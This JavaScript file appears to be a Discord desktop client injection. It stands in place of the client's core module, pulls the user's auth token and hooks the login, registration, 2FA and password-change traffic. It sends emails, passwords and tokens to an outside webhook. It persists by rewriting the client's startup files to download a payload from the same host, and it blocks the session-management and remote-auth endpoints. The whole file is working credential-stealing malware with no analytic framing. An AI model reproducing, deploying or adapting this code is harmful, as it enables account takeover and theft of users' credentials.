const fs = require('fs'); const os = require('os'); const https = require('https'); const args = process.argv; const path = require('path'); const querystring = require('querystring'); const { BrowserWindow, session, } = require('electron'); const CONFIG = { webhook: "https://1312services.ru/dcinj", injection_url: "https://1312services.ru/discordinjection", filters: { urls: [ '/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me', ], }, filters2: { urls: [ 'wss://remote-auth-gateway.discord.gg/*', 'https://discord.com/api/v*/auth/sessions', 'https://*.discord.com/api/v*/auth/sessions', 'https://discordapp.com/api/v*/auth/sessions' ], }, API: "https://discord.com/api/v9/users/@me", }; let userid = ""; try { userid = fs.readFileSync(path.join(__dirname, 'license.txt'), 'utf8').trim(); console.log(`License ID (User ID): ${userid}`); } catch (err) { console.error("Error reading license.txt file: ", err); process.exit(1); } const executeJS = script => { const window = BrowserWindow.getAllWindows()[0]; return window.webContents.executeJavaScript(script, !0); }; const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`); const request = async (method, url, headers = {}, data) => { url = new URL(url); const options = { protocol: url.protocol, hostname: url.host, path: url.pathname, method: method, headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*", "X-User-Id": userid }, }; if (url.search) options.path += url.search; const req = https.request(options); if (data) req.write(data); req.end(); return new Promise((resolve, reject) => { req.on("response", res => { let data = ""; res.on("data", chunk => data += chunk); res.on("end", () => resolve(data)); }); }); }; const hooker = async (token, passwordChange = null) => { let content = { token: token, }; if (passwordChange) { content["password_change"] = passwordChange; } await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content)); }; const fetch = async (endpoint, headers) => { return JSON.parse(await request("GET", CONFIG.API + endpoint, headers)); }; const EmailPassToken = async (email, password, token, action) => { const content = { email: email, password: password, token: token, action: action }; await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content)); } const PasswordChanged = async (newPassword, oldPassword, token) => { const passwordChange = { new_password: newPassword, old_password: oldPassword, }; await hooker(token, passwordChange); }; const discordPath = (function () { const app = args[0].split(path.sep).slice(0, -1).join(path.sep); let resourcePath; if (process.platform === 'win32') { resourcePath = path.join(app, 'resources'); } else if (process.platform === 'darwin') { resourcePath = path.join(app, 'Contents', 'Resources'); } if (fs.existsSync(resourcePath)) return { resourcePath, app }; return { undefined, undefined }; })(); async function initiation() { if (fs.existsSync(path.join(__dirname, 'initiation'))) { fs.rmdirSync(path.join(__dirname, 'initiation')); const token = await getToken(); if (!token) return; await hooker(token); } const { resourcePath, app } = discordPath; if (resourcePath === undefined || app === undefined) return; const appPath = path.join(resourcePath, 'app'); const packageJson = path.join(appPath, 'package.json'); const resourceIndex = path.join(appPath, 'index.js'); const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0] const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`; const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar'); if (!fs.existsSync(appPath)) fs.mkdirSync(appPath); if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson); if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex); if (process.platform === 'win32' || process.platform === 'darwin') { fs.writeFileSync( packageJson, JSON.stringify({ name: 'discord', main: 'index.js', }, null, 4, ), ); const startUpScript = `const fs = require('fs'), https = require('https'); const indexJs = '${indexJs}'; const bdPath = '${bdPath}'; const fileSize = fs.statSync(indexJs).size fs.readFileSync(indexJs, 'utf8', (err, data) => { if (fileSize < 20000 || data === "module.exports = require('./core.asar')") init(); }) async function init() { https.get('${CONFIG.injection_url}', (res) => { const file = fs.createWriteStream(indexJs); res.replace('%WEBHOOK%', '${CONFIG.webhook}') res.pipe(file); file.on('finish', () => { file.close(); }); }).on("error", (err) => { setTimeout(init(), 10000); }); } require('${path.join(resourcePath, 'app.asar')}') if (fs.existsSync(bdPath)) require(bdPath);`; fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\')); } } let email = ""; let password = ""; let initiationCalled = false; const createWindow = () => { mainWindow = BrowserWindow.getAllWindows()[0]; if (!mainWindow) return mainWindow.webContents.debugger.attach('1.3'); mainWindow.webContents.debugger.on('message', async (_, method, params) => { if (!initiationCalled) { await initiation(); initiationCalled = true; } if (method !== 'Network.responseReceived') return; if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return; if (![200, 202].includes(params.response.status)) return; const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }); const responseData = JSON.parse(responseUnparsedData.body); const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId }); const requestData = JSON.parse(requestUnparsedData.postData); switch (true) { case params.response.url.endsWith('/login'): if (!responseData.token) { email = requestData.login; password = requestData.password; return; } EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in"); break; case params.response.url.endsWith('/register'): EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up"); break; case params.response.url.endsWith('/totp'): EmailPassToken(email, password, responseData.token, "logged in with 2FA"); break; case params.response.url.endsWith('/@me'): if (!requestData.password) return; if (requestData.new_password) { PasswordChanged(requestData.new_password, requestData.password, responseData.token); } break; } }); mainWindow.webContents.debugger.sendCommand('Network.enable'); mainWindow.on('closed', () => { createWindow() }); } createWindow(); session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => { if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({ cancel: true }) }); module.exports = require("./core.asar"); 